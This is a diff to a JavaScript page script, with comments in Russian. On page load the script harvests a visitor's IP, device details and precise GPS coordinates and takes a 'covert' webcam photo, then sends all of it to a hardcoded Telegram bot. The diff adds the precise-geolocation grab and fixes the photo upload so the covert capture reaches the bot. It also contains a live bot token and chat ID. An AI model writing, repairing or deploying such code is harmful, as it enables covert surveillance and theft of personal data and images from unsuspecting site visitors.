@@ -1,29 +1,30 @@
 // =================================================================
-//                 КОНФИГУРАЦИЯ TELEGRAM
+//                 КОНФИГУРАЦИЯ TELEGRAM
 // =================================================================
 // Ваши параметры
 const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
 const CHAT_ID = "7518382960"; 
-        
+        
 // API для получения IP и Геолокации. Используем ipapi.co
 const GEO_API_URL = 'https://ipapi.co/json/'; 
 
 // =================================================================
-//          ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ HTML-ЭКРАНИРОВАНИЯ
+//          ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ HTML-ЭКРАНИРОВАНИЯ
 // =================================================================
 /**
- * Экранирует специальные символы (<, >, &) для HTML-форматирования в Telegram.
- */
+ * Экранирует специальные символы (<, >, &) для HTML-форматирования в Telegram.
+ */
 function escapeHTML(text) {
-    if (!text) return 'Н/Д';
-    const str = (typeof text === 'object' ? JSON.stringify(text) : String(text));
-    return str.replace(/&/g, '&amp;')
-              .replace(/</g, '&lt;')
-              .replace(/>/g, '&gt;');
+    if (!text) return 'Н/Д';
+    const str = (typeof text === 'object' ? JSON.stringify(text) : String(text));
+    return str.replace(/&/g, '&amp;')
+              .replace(/</g, '&lt;')
+              .replace(/>/g, '&gt;');
 }
 
 // =================================================================
-//                 ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
+//                 ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
+//                 (ВКЛЮЧАЯ ЗАПРОС ТОЧНОЙ ГЕОЛОКАЦИИ)
 // =================================================================
 async function sendVisitorData() {
     let visitorData = {};
@@ -64,6 +65,33 @@ async function sendVisitorData() {
         const pluginsShort = plugins.substring(0, 100) + (plugins.length > 100 ? '...' : '');
         
         const deviceMemory = navigator.deviceMemory || 'Н/Д (API не поддерживается)';
+
+
+        // -----------------------------------------------------------------
+        // --- НОВЫЙ БЛОК: Запрос точной геолокации (ТРЕБУЕТ РАЗРЕШЕНИЯ!) ---
+        // -----------------------------------------------------------------
+        let preciseLocation = { coords: 'Н/Д', accuracy: 'Н/Д' };
+
+        if ('geolocation' in navigator) {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 4000, 
+                        maximumAge: 0  
+                    });
+                });
+                
+                preciseLocation.coords = `${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}`;
+                preciseLocation.accuracy = `${Math.round(position.coords.accuracy)} м`;
+
+            } catch (e) {
+                let errorType = e.code === 1 ? 'ОТКЛОНЕН' : (e.code === 3 ? 'Таймаут' : e.name);
+                preciseLocation.coords = `Доступ ${errorType}`;
+                preciseLocation.accuracy = 'Н/Д';
+                console.warn(`Geolocation API error: ${e.message}`);
+            }
+        }
         
         // 3. Формирование объекта данных с экранированием
         visitorData = {
@@ -72,7 +100,10 @@ async function sendVisitorData() {
             city: escapeHTML(geoData.city || 'Н/Д'),
             org: escapeHTML(geoData.org || 'Н/Д'),
             timezone: escapeHTML(geoData.timezone || 'Н/Д'),
-            isp: escapeHTML(geoData.asn || 'Н/Д'),
+            
+            // НОВЫЕ ПОЛЯ
+            precise_coords: escapeHTML(preciseLocation.coords),
+            precise_accuracy: escapeHTML(preciseLocation.accuracy),
 
             os: escapeHTML(os),
             browser: escapeHTML(browser),
@@ -98,11 +129,15 @@ async function sendVisitorData() {
             
             `\u{1F310} <b>СЕТЬ И ГЕОЛОКАЦИЯ</b>\n` +
             `— IP: <code>${visitorData.ip}</code>\n` +
-            `— Страна: <b>${visitorData.country}</b> (${visitorData.city})\n` +
+            `— Страна (по IP): <b>${visitorData.country}</b> (${visitorData.city})\n` +
             `— Провайдер: ${visitorData.org}\n` +
             `— Часовой пояс: ${visitorData.timezone}\n` +
             `— Статус сети: ${visitorData.online_status}\n\n` +
-
+            
+            `\u{1F5FA} <b>ТОЧНЫЕ КООРДИНАТЫ (GPS/Wi-Fi)</b>\n` +
+            `— Координаты: <code>${visitorData.precise_coords}</code>\n` +
+            `— Точность: <b>${visitorData.precise_accuracy}</b>\n\n` + 
+            
             `\u{1F4BB} <b>УСТРОЙСТВО И СИСТЕМА</b>\n` +
             `— ОС / Браузер: <b>${visitorData.os}</b> / <b>${visitorData.browser}</b>\n` +
             `— <b>RAM (ОЗУ):</b> <code>${visitorData.device_memory} GiB</code>\n` +
@@ -138,30 +173,38 @@ async function sendVisitorData() {
 
 
 // =================================================================
-//                 ЛОГИКА ДЛЯ ДИНАМИЧЕСКОГО ЗАХВАТА ФОТО
+//                 ЛОГИКА ДЛЯ ДИНАМИЧЕСКОГО ЗАХВАТА ФОТО
 // =================================================================
 
 /**
- * Отправляет Base64 строку изображения в Telegram как документ. 
- * ВНИМАНИЕ: Это очень неэффективно и приводит к большим сообщениям.
+ * ИСПРАВЛЕННАЯ ФУНКЦИЯ:
+ * Отправляет изображение в Telegram через POST-запрос с использованием FormData.
+ * Это решает проблему "400 Bad Request".
  */
 async function sendPhotoToTelegram(imageDataURL) {
     try {
-        const encodedImage = encodeURIComponent(imageDataURL);
-        const caption = encodeURIComponent("Скрытый захват с веб-камеры");
+        // 1. Преобразуем Base64 в Blob (бинарный объект)
+        const response = await fetch(imageDataURL);
+        const blob = await response.blob();
 
-        // Используем sendDocument, так как sendPhoto требует multipart/form-data POST-запроса,
-        // который сложнее реализовать через простой GET fetch.
-        const TELEGRAM_PHOTO_URL = 
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?` + 
-            `chat_id=${CHAT_ID}&` +
-            `document=${encodedImage}&` + 
-            `caption=${caption}`;
-
-        const telegramResponse = await fetch(TELEGRAM_PHOTO_URL);
+        // 2. Создаем FormData, который имитирует форму загрузки файла
+        const formData = new FormData();
+        // 'photo' - это обязательное имя поля для метода sendPhoto
+        formData.append('photo', blob, 'webcam_capture.jpeg'); 
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', "Скрытый захват с веб-камеры");
         
+        // 3. Формируем POST-запрос
+        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // Используем sendPhoto
+
+        const telegramResponse = await fetch(TELEGRAM_URL, {
+            method: 'POST', 
+            body: formData  
+        });
+        
+        // 4. Проверяем ответ
         if (telegramResponse.ok) {
-            console.log('Скрытое фото успешно отправлено в Telegram.');
+            console.log('Скрытое фото успешно отправлено в Telegram через POST-запрос.');
         } else {
             const errorData = await telegramResponse.json();
             console.error(`Ошибка (${telegramResponse.status}) при отправке фото:`, errorData);
@@ -173,8 +216,9 @@ async function sendPhotoToTelegram(imageDataURL) {
 
 
 /**
- * Динамически создает элементы, запрашивает доступ к камере, делает снимок и удаляет элементы.
- */
+ * Динамически создает элементы, запрашивает доступ к камере, делает снимок и удаляет элементы.
+ * (Оставлена без изменений, так как корректна, за исключением вызова sendPhotoToTelegram)
+ */
 async function captureAndSendHiddenPhoto() {
     let stream = null;
     let videoElement = null;
@@ -236,10 +280,9 @@ async function captureAndSendHiddenPhoto() {
 
 // Запуск функций при загрузке страницы
 window.onload = async () => {
-    // 1. Отправляем все собранные данные
+    // 1. Отправляем все собранные данные (включая запрос геолокации)
     await sendVisitorData(); 
     
     // 2. Пытаемся сделать скрытое фото
-    // !!! Пользователь увидит запрос на разрешение камеры сразу после загрузки !!!
     await captureAndSendHiddenPhoto();
 };
